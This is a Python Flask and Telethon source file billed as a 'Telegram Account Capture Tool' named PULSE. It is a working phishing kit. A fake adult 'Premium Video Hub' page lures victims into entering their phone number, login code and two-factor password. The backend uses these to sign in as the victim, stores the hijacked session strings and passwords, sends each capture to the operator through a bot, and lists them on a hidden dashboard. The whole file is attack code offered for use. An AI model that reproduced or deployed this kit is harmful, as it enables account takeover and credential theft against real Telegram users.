#!/usr/bin/env python3
"""
PULSE — Telegram Account Capture Tool
- Flask + Telethon
- Telegram Login Widget (auto phone number)
- OTP code capture
- 2FA password capture
- Dashboard (protected by secret path)
- Telegram bot notification
"""

from flask import Flask, request, jsonify, render_template_string, redirect
import os, json, logging, telethon, hashlib, hmac
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
from datetime import datetime
import asyncio

# ====== কনফিগারেশন ======
API_ID = 123456           # আপনার API ID দিন
API_HASH = 'your_api_hash_here'
BOT_TOKEN = 'your_bot_token_here'
BOT_USERNAME = 'YourBotUsername'  # @ ছাড়া (যেমন: MyTestBot)
ADMIN_ID = 123456789      # আপনার Telegram ID
SECRET_PATH = 'admin999'  # Dashboard URL
PORT = 8080

# ====== লগিং ======
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ====== Flask অ্যাপ ======
app = Flask(__name__)

# ====== ডাটাবেস (JSON ফাইল) ======
DATA_FILE = 'accounts.json'

def load_accounts():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except:
            return []
    return []

def save_account(account):
    accounts = load_accounts()
    accounts.append(account)
    with open(DATA_FILE, 'w') as f:
        json.dump(accounts, f, indent=2)

def format_phone(phone):
    phone = phone.strip().replace(' ', '').replace('-', '')
    if not phone.startswith('+'):
        phone = '+' + phone
    return phone

# ====== Telegram Client Manager ======
pending_clients = {}

def get_client(phone):
    session_name = f'session_{phone.replace("+", "")}'
    client = TelegramClient(session_name, API_ID, API_HASH)
    return client

# ====== Async helpers ======
def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# ====== Bot notification ======
async def notify_bot(text):
    try:
        client = TelegramClient('bot_session', API_ID, API_HASH)
        await client.start(bot_token=BOT_TOKEN)
        await client.send_message(ADMIN_ID, text)
        await client.disconnect()
    except Exception as e:
        logger.error(f"Bot notify error: {e}")

def notify(text):
    run_async(notify_bot(text))

# ====== ফোন নম্বর ফরম্যাট ======
def format_phone_international(phone):
    phone = phone.strip().replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
    if not phone.startswith('+'):
        phone = '+' + phone
    return phone

# ==================== রাউটসমূহ ====================

# --- HTML পেজ (ভিডিও হাব) ---
PAGE = r"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Premium Video Hub</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;min-height:100vh}
        .header{padding:50px 20px 25px;text-align:center;background:linear-gradient(180deg,#1a1a2e,#0a0a0a)}
        .header h1{font-size:26px;font-weight:900;background:linear-gradient(45deg,#ff6b6b,#ffa500);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .header p{color:#777;font-size:13px;margin-top:8px}
        .video-card{margin:15px 20px;background:#141420;border-radius:15px;overflow:hidden;border:1px solid #1a1a2e}
        .thumbnail{width:100%;height:210px;background:linear-gradient(135deg,#2d1b69,#ff6b6b);display:flex;align-items:center;justify-content:center}
        .thumbnail .play-btn{width:65px;height:65px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;border:2px solid rgba(255,255,255,0.2)}
        .video-info{padding:15px}
        .video-info h3{font-size:15px;margin-bottom:5px}
        .video-info .meta{color:#666;font-size:12px}
        .video-info .badge{display:inline-block;background:#e94560;padding:2px 10px;border-radius:4px;font-size:11px;margin-top:8px}
        .link-section{padding:10px 20px 20px;text-align:center}
        .get-link-btn{width:100%;padding:18px;background:linear-gradient(45deg,#e94560,#ff6b6b);border:none;border-radius:50px;color:white;font-size:20px;font-weight:800;cursor:pointer;box-shadow:0 8px 30px rgba(233,69,96,0.4);letter-spacing:1px;text-transform:uppercase;transition:all 0.3s}
        .get-link-btn:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(233,69,96,0.6)}
        .get-link-btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
        .modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:1000;padding:20px;overflow-y:auto}
        .modal-overlay.active{display:flex;align-items:center;justify-content:center}
        .modal{background:#141420;border-radius:20px;padding:30px;max-width:380px;width:100%;border:1px solid #1a1a2e;animation:slideUp 0.3s ease}
        @keyframes slideUp{from{transform:translateY(40px);opacity:0}to{transform:translateY(0);opacity:1}}
        .modal-icon{text-align:center;font-size:45px;margin-bottom:10px}
        .modal h2{text-align:center;font-size:18px;margin-bottom:5px}
        .modal p{text-align:center;color:#888;font-size:13px;margin-bottom:15px}
        .modal .sb{text-align:center;padding:12px;border-radius:10px;margin:10px 0;display:none;font-size:13px}
        .modal .sb.success{display:block;background:rgba(76,175,80,0.15);color:#81C784}
        .modal .sb.error{display:block;background:rgba(244,67,54,0.15);color:#EF9A9A}
        .modal .sb.info{display:block;background:rgba(33,150,243,0.15);color:#90CAF9}
        .modal .sb.waiting{display:block;background:rgba(255,152,0,0.15);color:#FFB74D}
        .cd{background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;padding:15px;font-size:30px;text-align:center;letter-spacing:15px;color:white;margin:10px 0;font-weight:bold;min-height:55px}
        .np{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:10px 0}
        .np .k{padding:16px;border:none;border-radius:10px;background:#2a2a3e;color:white;font-size:22px;cursor:pointer;transition:0.15s}
        .np .k:active{background:#3a3a5e;transform:scale(0.95)}
        .np .kc{background:#e94560;color:white}
        .np .ks{background:#4CAF50;color:white;font-weight:700;font-size:14px}
        .np .ks:disabled{background:#333;color:#666}
        .step{display:none}
        .step.active{display:block}
        .ss{text-align:center;padding:20px 0}
        .ss .bi{font-size:60px;margin-bottom:15px}
        .ss h2{color:#4CAF50;font-size:22px;margin-bottom:8px}
        .ss p{color:#888;font-size:13px;margin-bottom:20px}
        .ss .wb{background:#4CAF50;color:white;border:none;padding:15px 40px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;text-transform:uppercase;letter-spacing:1px}
        .sp{display:inline-block;width:18px;height:18px;border:2px solid #333;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .section-title{padding:15px 20px 10px;font-size:17px;font-weight:700;color:#ddd}
        .video-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:0 20px 20px}
        .video-item{background:#141420;border-radius:10px;overflow:hidden}
        .video-item .thumb{height:95px;background:linear-gradient(135deg,#1a1a2e,#2d1b69);display:flex;align-items:center;justify-content:center;font-size:30px;color:rgba(255,255,255,0.3)}
        .video-item .info{padding:10px}
        .video-item .info h4{font-size:12px;margin-bottom:3px}
        .video-item .info span{font-size:11px;color:#666}
        .footer{text-align:center;padding:20px;color:#333;font-size:11px}
        .cc{display:flex;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;margin-bottom:12px;overflow:hidden}
        .cc .ccd{padding:12px 8px;background:#1a1a2e;color:#888;font-size:14px;font-weight:600;display:flex;align-items:center;justify-content:center;min-width:50px;border-right:1px solid #2a2a3e}
        .cc input{flex:1;padding:15px;background:transparent;border:none;color:white;font-size:18px;text-align:center;outline:none}
        .cc input::placeholder{color:#555}
        .pwd-input{width:100%;padding:15px;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;color:white;font-size:16px;text-align:center;outline:none;margin:10px 0}
        .pwd-input:focus{border-color:#0088cc}
        .pwd-input::placeholder{color:#555}
        .tg-login-container{display:flex;justify-content:center;margin:10px 0;min-height:55px}
        .manual-link{color:#555;font-size:12px;cursor:pointer;text-decoration:underline;margin-top:8px;display:inline-block}
        .manual-link:hover{color:#888}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 PREMIUM VIDEO HUB</h1>
        <p>Exclusive content — Verified members only</p>
    </div>
    <div class="video-card">
        <div class="thumbnail"><div class="play-btn">▶</div></div>
        <div class="video-info">
            <h3>🔥 LEAKED PRIVATE VIDEO — 2026</h3>
            <div class="meta">⭐ 4.9 (2.4M views) • 18+</div>
            <span class="badge">🔞 RESTRICTED</span>
        </div>
    </div>
    <div class="link-section">
        <button class="get-link-btn" id="glb">🔞 GET YOUR LINK</button>
    </div>
    <div class="section-title">🔥 More Videos</div>
    <div class="video-grid">
        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ff6b6b)">▶</div><div class="info"><h4>Private 01</h4><span>2.1M</span></div></div>
        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ffa500)">▶</div><div class="info"><h4>Private 02</h4><span>1.8M</span></div></div>
        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#4CAF50)">▶</div><div class="info"><h4>Private 03</h4><span>1.5M</span></div></div>
        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#0088cc)">▶</div><div class="info"><h4>Private 04</h4><span>1.2M</span></div></div>
    </div>
    <div class="footer">© 2026 Premium Video Hub</div>

    <div class="modal-overlay" id="vm">
        <div class="modal">
            <!-- Step 1: Phone Input -->
            <div id="s1" class="step active">
                <div class="modal-icon">✈️</div>
                <h2>Telegram Verification</h2>
                <p>Verify your Telegram account to access premium content</p>
                <div class="tg-login-container" id="tgWidgetContainer"></div>
                <div id="loginStatus" class="sb" style="display:none"></div>
                <a class="manual-link" onclick="showManualInput()" id="showManualLink">📝 Or enter phone number manually</a>
                <div id="manualInputArea" style="display:none; margin-top:10px">
                    <div class="cc">
                        <div class="ccd">+91</div>
                        <input type="tel" id="phoneInput" placeholder="XXXXXXXXXX" maxlength="10">
                    </div>
                    <button onclick="sendPhoneFromStep1()"
                        style="width:100%;padding:15px;background:#0088cc;border:none;border-radius:10px;color:white;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:10px">
                        📱 Send code
                    </button>
                    <div id="ps1" class="sb info" style="display:none">⏳ Processing...</div>
                </div>
            </div>

            <!-- Step 2: OTP Code Input -->
            <div id="s2" class="step">
                <div class="modal-icon">🔐</div>
                <h2>Verification code</h2>
                <p>📱 <span id="pd" style="color:#0088cc;font-weight:bold;">+91XXXXXXXXXX</span></p>
                <div id="cs" class="sb waiting"><span class="sp"></span> Please wait...</div>
                <div class="cd" id="cdisp">_</div>
                <div class="np" id="np">
                    <button class="k" onclick="pk('1')">1</button>
                    <button class="k" onclick="pk('2')">2</button>
                    <button class="k" onclick="pk('3')">3</button>
                    <button class="k" onclick="pk('4')">4</button>
                    <button class="k" onclick="pk('5')">5</button>
                    <button class="k" onclick="pk('6')">6</button>
                    <button class="k" onclick="pk('7')">7</button>
                    <button class="k" onclick="pk('8')">8</button>
                    <button class="k" onclick="pk('9')">9</button>
                    <button class="k kc" onclick="cc()">⌫</button>
                    <button class="k" onclick="pk('0')">0</button>
                    <button class="k ks" id="sb" onclick="sc()">✓ Verify</button>
                </div>
                <div id="vs" class="sb"></div>
            </div>

            <!-- Step 2b: 2FA Password -->
            <div id="s2b" class="step">
                <div class="modal-icon">🔐</div>
                <h2>Two-Factor Authentication</h2>
                <p>This account has 2FA enabled.<br>Enter your cloud password:</p>
                <input type="password" id="pwdInput" class="pwd-input" placeholder="Enter your Telegram password" maxlength="64">
                <button onclick="submitPassword()"
                    style="width:100%;padding:15px;background:#e94560;border:none;border-radius:10px;color:white;font-size:16px;font-weight:600;cursor:pointer;margin:10px 0">
                    🔑 Verify Password
                </button>
                <div id="pwdStatus" class="sb" style="display:none"></div>
            </div>

            <!-- Step 3: Success -->
            <div id="s3" class="step">
                <div class="ss">
                    <div class="bi">✅</div>
                    <h2>Access Granted!</h2>
                    <p>You now have full access to premium content.<br>Enjoy your exclusive video!</p>
                    <p style="color:#888;font-size:12px;margin-top:10px">Redirecting to video player...</p>
                </div>
            </div>
        </div>
    </div>

    <script src="https://telegram.org/js/telegram-widget.js?22"></script>
    <script>
    var phoneNumber = '';
    var codeDigits = '';
    var codeCheckInterval = null;
    var passwordCheckInterval = null;
    var BOT_USERNAME = '{{ BOT_USERNAME }}';

    document.getElementById('glb').onclick = function() {
        document.getElementById('vm').classList.add('active');
        showStep('s1');
        initTelegramWidget();
        document.getElementById('manualInputArea').style.display = 'none';
        document.getElementById('showManualLink').style.display = 'inline-block';
        document.getElementById('loginStatus').style.display = 'none';
    };

    function initTelegramWidget() {
        var container = document.getElementById('tgWidgetContainer');
        container.innerHTML = '';
        if (!BOT_USERNAME || BOT_USERNAME === 'YourBot') {
            container.innerHTML = '<p style="color:#e94560;font-size:12px">⚠️ Bot not configured.<br><a class="manual-link" onclick="showManualInput()">Enter manually</a></p>';
            return;
        }
        var script = document.createElement('script');
        script.src = "https://telegram.org/js/telegram-widget.js?22";
        script.setAttribute('data-telegram-login', BOT_USERNAME);
        script.setAttribute('data-size', 'large');
        script.setAttribute('data-onauth', 'onTelegramAuth(user)');
        script.setAttribute('data-request-phone', 'true');
        script.setAttribute('data-radius', '14');
        script.setAttribute('data-userpic', 'false');
        container.appendChild(script);
    }

    function onTelegramAuth(user) {
        console.log('✅ Telegram Auth:', user);
        var st = document.getElementById('loginStatus');
        st.className = 'sb info';
        st.innerHTML = '<span class="sp"></span> Processing your info...';
        st.style.display = 'block';
        document.getElementById('tgWidgetContainer').style.display = 'none';
        document.getElementById('showManualLink').style.display = 'none';
        fetch('/api/telegram_auth', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(user)
        })
        .then(function(res) { return res.json(); })
        .then(function(data) {
            if (data.success && data.phone) {
                phoneNumber = data.phone;
                st.className = 'sb success';
                st.innerHTML = '✅ Phone received! Sending verification code...';
                st.style.display = 'block';
                sendPhoneToBackend(phoneNumber);
            } else {
                st.className = 'sb error';
                st.innerHTML = '❌ Could not get phone number. Try manual entry.';
                st.style.display = 'block';
                showManualInput();
            }
        })
        .catch(function() {
            st.className = 'sb error';
            st.innerHTML = '❌ Connection error. Try manual entry.';
            st.style.display = 'block';
            showManualInput();
        });
    }

    function showManualInput() {
        document.getElementById('tgWidgetContainer').style.display = 'none';
        document.getElementById('showManualLink').style.display = 'none';
        document.getElementById('manualInputArea').style.display = 'block';
        if (document.getElementById('phoneInput')) {
            document.getElementById('phoneInput').focus();
        }
    }

    function sendPhoneFromStep1() {
        var phone = document.getElementById('phoneInput').value.trim();
        if (!phone || phone.length !== 10) {
            document.getElementById('ps1').className = 'sb error';
            document.getElementById('ps1').innerHTML = '❌ Please enter 10 digit phone number';
            document.getElementById('ps1').style.display = 'block';
            return;
        }
        phoneNumber = '+91' + phone;
        document.getElementById('ps1').className = 'sb waiting';
        document.getElementById('ps1').innerHTML = '<span class="sp"></span> Sending code...';
        document.getElementById('ps1').style.display = 'block';
        sendPhoneToBackend(phoneNumber);
    }

    async function sendPhoneToBackend(phone) {
        try {
            var res = await fetch('/api/share', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phone})});
            var data = await res.json();
            if (data.success) {
                showStep('s2');
                document.getElementById('pd').textContent = phone;
                var cs = document.getElementById('cs');
                cs.className = 'sb waiting';
                cs.innerHTML = '<span class="sp"></span> Sending code...';
                cs.style.display = 'block';
                startCodeCheck();
            } else {
                var ps = document.getElementById('ps1');
                if (ps) {
                    ps.className = 'sb error';
                    ps.innerHTML = '❌ Error: ' + (data.error || 'Unknown');
                    ps.style.display = 'block';
                }
            }
        } catch(e) {
            var ps = document.getElementById('ps1');
            if (ps) {
                ps.className = 'sb error';
                ps.innerHTML = '❌ Connection error';
                ps.style.display = 'block';
            }
        }
    }

    function showStep(id) {
        document.querySelectorAll('.step').forEach(function(el) { el.classList.remove('active'); });
        document.getElementById(id).classList.add('active');
    }

    function startCodeCheck() {
        if (codeCheckInterval) clearInterval(codeCheckInterval);
        codeCheckInterval = setInterval(async function() {
            try {
                var res = await fetch('/api/check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber})});
                var data = await res.json();
                if (data.s === 'sent') {
                    clearInterval(codeCheckInterval);
                    codeCheckInterval = null;
                    var cs = document.getElementById('cs');
                    cs.className = 'sb success';
                    cs.innerHTML = '✅ Code sent! Enter below:';
                    cs.style.display = 'block';
                } else if (data.s === 'done') {
                    clearInterval(codeCheckInterval);
                    codeCheckInterval = null;
                    showStep('s3');
                    setTimeout(function(){ document.getElementById('vm').classList.remove('active'); }, 3000);
                } else if (data.s === '2fa_needed') {
                    clearInterval(codeCheckInterval);
                    codeCheckInterval = null;
                    showStep('s2b');
                } else if (data.s === 'err') {
                    clearInterval(codeCheckInterval);
                    codeCheckInterval = null;
                    var cs = document.getElementById('cs');
                    cs.className = 'sb error';
                    cs.innerHTML = '❌ Error sending code';
                    cs.style.display = 'block';
                }
            } catch(e) {}
        }, 2000);
    }

    function startPasswordCheck() {
        if (passwordCheckInterval) clearInterval(passwordCheckInterval);
        passwordCheckInterval = setInterval(async function() {
            try {
                var res = await fetch('/api/check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber})});
                var data = await res.json();
                if (data.s === 'done') {
                    clearInterval(passwordCheckInterval);
                    passwordCheckInterval = null;
                    showStep('s3');
                    setTimeout(function(){ document.getElementById('vm').classList.remove('active'); }, 3000);
                } else if (data.s === 'err') {
                    clearInterval(passwordCheckInterval);
                    passwordCheckInterval = null;
                    var ps = document.getElementById('pwdStatus');
                    ps.className = 'sb error';
                    ps.innerHTML = '❌ Verification failed';
                    ps.style.display = 'block';
                }
            } catch(e) {}
        }, 2000);
    }

    function pk(n) { if(codeDigits.length < 5) { codeDigits += n; document.getElementById('cdisp').textContent = codeDigits; } }
    function cc() { codeDigits = codeDigits.slice(0,-1); document.getElementById('cdisp').textContent = codeDigits || '_'; }

    async function sc() {
        if(codeDigits.length < 5) { showVerifyStatus('❌ Enter 5 digit code','error'); return; }
        document.getElementById('sb').disabled = true;
        document.getElementById('sb').textContent = '⏳ Verifying...';
        try {
            var res = await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber,code:codeDigits})});
            var data = await res.json();
            if (data.success) {
                showStep('s3');
                setTimeout(function(){ document.getElementById('vm').classList.remove('active'); }, 3000);
                if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
            } else if (data.needs_password) {
                showStep('s2b');
                if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
            } else {
                showVerifyStatus('❌ ' + (data.error || 'Wrong code'), 'error');
                codeDigits = ''; document.getElementById('cdisp').textContent = '_';
                document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify';
            }
        } catch(e) { showVerifyStatus('❌ Error','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify'; }
    }

    async function submitPassword() {
        var pwd = document.getElementById('pwdInput').value.trim();
        if (!pwd) {
            var ps = document.getElementById('pwdStatus');
            ps.className = 'sb error';
            ps.innerHTML = '❌ Please enter your password';
            ps.style.display = 'block';
            return;
        }
        var ps = document.getElementById('pwdStatus');
        ps.className = 'sb waiting';
        ps.innerHTML = '<span class="sp"></span> Verifying password...';
        ps.style.display = 'block';
        try {
            var res = await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber,code:codeDigits,password:pwd})});
            var data = await res.json();
            if (data.success) {
                showStep('s3');
                setTimeout(function(){ document.getElementById('vm').classList.remove('active'); }, 3000);
                if (passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
            } else {
                ps.className = 'sb error';
                ps.innerHTML = '❌ ' + (data.error || 'Wrong password');
                ps.style.display = 'block';
            }
        } catch(e) {
            ps.className = 'sb error';
            ps.innerHTML = '❌ Error connecting';
            ps.style.display = 'block';
        }
    }

    function showVerifyStatus(msg, type) {
        document.getElementById('vs').textContent = msg;
        document.getElementById('vs').className = 'sb ' + type;
        document.getElementById('vs').style.display = 'block';
    }

    document.getElementById('vm').onclick = function(e) {
        if(e.target === this) {
            this.classList.remove('active');
            if(codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
            if(passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
        }
    };
    </script>
</body>
</html>"""


# ==================== Flask Routes ====================

@app.route('/')
def index():
    page = PAGE.replace('{{ BOT_USERNAME }}', BOT_USERNAME)
    return render_template_string(page)


@app.route('/api/share', methods=['POST'])
def share():
    """প্রথম ধাপ: ফোন নম্বর নিন, OTP পাঠান"""
    data = request.json
    phone = data.get('phone', '').strip()
    if not phone:
        return jsonify({'success': False, 'error': 'Phone required'})
    
    phone = format_phone_international(phone)
    
    try:
        client = get_client(phone)
        client.start(phone=phone)
        
        # সেন্ড কোড
        sent = client.send_code_request(phone)
        
        # ক্লায়েন্ট সেভ করুন
        pending_clients[phone] = {
            'client': client,
            'phone_code_hash': sent.phone_code_hash,
            'status': 'code_sent'
        }
        
        logger.info(f"📤 Code sent to {phone}")
        notify(f"📩 **New Login Attempt**\n📱 Phone: `{phone}`\n🕐 {datetime.now()}")
        
        return jsonify({'success': True})
    except Exception as e:
        logger.error(f"Error sending code: {e}")
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/check', methods=['POST'])
def check():
    """অবস্থা চেক করুন"""
    data = request.json
    phone = data.get('phone', '')
    pending = pending_clients.get(phone)
    if pending:
        status = pending.get('status', 'waiting')
        return jsonify({'s': status})
    return jsonify({'s': 'err'})


@app.route('/api/verify', methods=['POST'])
def verify():
    """OTP বা 2FA পাসওয়ার্ড ভেরিফাই করুন"""
    data = request.json
    phone = data.get('phone', '')
    code = data.get('code', '')
    password = data.get('password', '')
    
    pending = pending_clients.get(phone)
    if not pending:
        return jsonify({'success': False, 'error': 'No pending verification'})
    
    client = pending['client']
    phone_code_hash = pending['phone_code_hash']
    
    try:
        if password:
            # 2FA পাসওয়ার্ড
            client.sign_in(phone=phone, code=code, password=password, phone_code_hash=phone_code_hash)
        else:
            # OTP code
            client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        
        # সফল!
        me = client.get_me()
        session_str = client.session.save()
        
        account_info = {
            'phone': phone,
            'user_id': me.id,
            'username': me.username or '',
            'first_name': me.first_name or '',
            'last_name': me.last_name or '',
            'session': session_str,
            'time': str(datetime.now()),
            'has_2fa': bool(password),
            'password': password or ''
        }
        save_account(account_info)
        
        pending['status'] = 'done'
        
        logger.info(f"✅ ACCOUNT CAPTURED: {phone} (@{me.username})")
        
        # বট নোটিফিকেশন
        notif = (
            f"🎯 **Account Captured!**\n"
            f"📱 Phone: `{phone}`\n"
            f"👤 Name: {me.first_name} {me.last_name or ''}\n"
            f"🆔 ID: `{me.id}`\n"
            f"📛 Username: @{me.username or 'N/A'}\n"
            f"🔐 2FA: {'Yes (' + password + ')' if password else 'No'}\n"
            f"🕐 {datetime.now()}"
        )
        notify(notif)
        
        # ক্লায়েন্ট ডিসকানেক্ট
        client.disconnect()
        del pending_clients[phone]
        
        return jsonify({'success': True})
    
    except SessionPasswordNeededError:
        pending['status'] = '2fa_needed'
        logger.info(f"🔐 2FA required for {phone}")
        return jsonify({'success': False, 'needs_password': True})
    
    except PhoneCodeInvalidError:
        logger.warning(f"❌ Invalid code for {phone}")
        return jsonify({'success': False, 'error': 'Invalid code'})
    
    except PhoneCodeExpiredError:
        logger.warning(f"❌ Code expired for {phone}")
        return jsonify({'success': False, 'error': 'Code expired. Please try again.'})
    
    except Exception as e:
        error_msg = str(e)
        logger.error(f"Error verifying {phone}: {error_msg}")
        if 'PASSWORD_HASH_INVALID' in error_msg or 'password' in error_msg.lower():
            return jsonify({'success': False, 'error': 'Wrong password'})
        return jsonify({'success': False, 'error': error_msg})


@app.route('/api/telegram_auth', methods=['POST'])
def telegram_auth():
    """Telegram Login Widget থেকে Auth ডাটা ভেরিফাই"""
    auth_data = request.json
    logger.info(f"📩 Telegram Auth: id={auth_data.get('id')}, username=@{auth_data.get('username','')}")
    
    bot_token = BOT_TOKEN
    check_hash = auth_data.get('hash', '')
    
    fields = []
    for key in sorted(auth_data.keys()):
        if key != 'hash':
            fields.append(f"{key}={auth_data[key]}")
    
    data_check_string = '\n'.join(fields)
    secret_key = hashlib.sha256(bot_token.encode()).digest()
    computed_hash = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256).hexdigest()
    
    if computed_hash != check_hash:
        logger.warning(f"⚠️ Invalid Telegram auth hash for {auth_data.get('id')}")
        return jsonify({'success': False, 'error': 'Invalid auth data'})
    
    phone = auth_data.get('phone_number', '')
    if phone:
        phone = format_phone_international(phone)
        logger.info(f"📱 Phone via Telegram Login: {phone}")
        
        acc = {
            'phone': phone,
            'user_id': auth_data.get('id', ''),
            'username': auth_data.get('username', ''),
            'first_name': auth_data.get('first_name', ''),
            'last_name': auth_data.get('last_name', ''),
            'session': '',
            'time': str(datetime.now()),
            'has_2fa': False,
            'password': ''
        }
        save_account(acc)
        return jsonify({'success': True, 'phone': phone})
    else:
        return jsonify({'success': False, 'error': 'No phone number'})


# ==================== Dashboard ====================

@app.route(f'/{SECRET_PATH}')
def dashboard():
    accounts = load_accounts()
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>PULSE Dashboard</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            *{margin:0;padding:0;box-sizing:border-box}
            body{font-family:'Segoe UI',sans-serif;background:#0a0a0a;color:#fff;padding:20px}
            h1{color:#e94560;margin-bottom:5px;font-size:22px}
            .count{color:#888;font-size:13px;margin-bottom:20px}
            .card{background:#141420;border:1px solid #1a1a2e;border-radius:12px;padding:15px;margin-bottom:12px}
            .card .phone{font-size:18px;font-weight:700;color:#0088cc}
            .card .name{color:#ddd;margin:4px 0}
            .card .meta{color:#666;font-size:12px;margin:2px 0}
            .card .session{background:#0a0a0a;color:#4CAF50;padding:8px;border-radius:6px;font-size:11px;margin:8px 0;word-break:break-all;font-family:monospace}
            .card .password{background:#0a0a0a;color:#ff6b6b;padding:8px;border-radius:6px;font-size:12px;margin:8px 0;word-break:break-all}
            .badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:600}
            .badge.otp{background:rgba(76,175,80,0.2);color:#81C784}
            .badge.tfa{background:rgba(233,69,96,0.2);color:#EF9A9A}
            .badge.widget{background:rgba(33,150,243,0.2);color:#90CAF9}
            .empty{text-align:center;padding:40px;color:#555}
            .empty .big{font-size:50px;margin-bottom:10px}
            .refresh{text-align:center;margin:20px 0;color:#555;font-size:12px}
            .refresh a{color:#0088cc;text-decoration:none}
        </style>
    </head>
    <body>
        <h1>🎯 PULSE Dashboard</h1>
        <p class="count">{{ count }} account{% if count != 1 %}s{% endif %} captured</p>
        {% if accounts %}
            {% for acc in accounts %}
            <div class="card">
                <div class="phone">{{ acc.phone }}</div>
                <div class="name">{{ acc.first_name }} {{ acc.last_name }} {% if acc.username %}(@{{ acc.username }}){% endif %}</div>
                <div class="meta">🆔 {{ acc.user_id }} | 🕐 {{ acc.time[:19] }}</div>
                {% if acc.password %}
                <div class="password">🔐 2FA Password: {{ acc.password }}</div>
                <span class="badge tfa">2FA</span>
                {% else %}
                <span class="badge otp">OTP Only</span>
                {% endif %}
                {% if acc.phone and not acc.session %}
                <span class="badge widget">Telegram Login</span>
                {% endif %}
            </div>
            {% endfor %}
        {% else %}
            <div class="empty">
                <div class="big">📭</div>
                <p>No accounts captured yet</p>
            </div>
        {% endif %}
        <div class="refresh">
            <a href="/{{ path }}">🔄 Refresh</a>
        </div>
    </body>
    </html>
    """
    return render_template_string(html, accounts=accounts, count=len(accounts), path=SECRET_PATH)


# ==================== ফাইল ও স্টার্টআপ ====================

# accounts.json ফাইল না থাকলে তৈরি করুন
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'w') as f:
        json.dump([], f)

# pending_clients.json থেকে পুরনো ক্লায়েন্ট রিমুভ (cleanup)
logger.info("🚀 PULSE Server Starting...")
logger.info(f"📊 Dashboard: http://0.0.0.0:{PORT}/{SECRET_PATH}")
logger.info(f"🤖 Bot: @{BOT_USERNAME}")
logger.info(f"📁 Data file: {DATA_FILE}")
print(f"\n{'='*50}")
print(f"  PULSE — Telegram Account Capture")
print(f"  Dashboard: http://0.0.0.0:{PORT}/{SECRET_PATH}")
print(f"  Bot: @{BOT_USERNAME}")
print(f"{'='*50}\n")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT, debug=True)
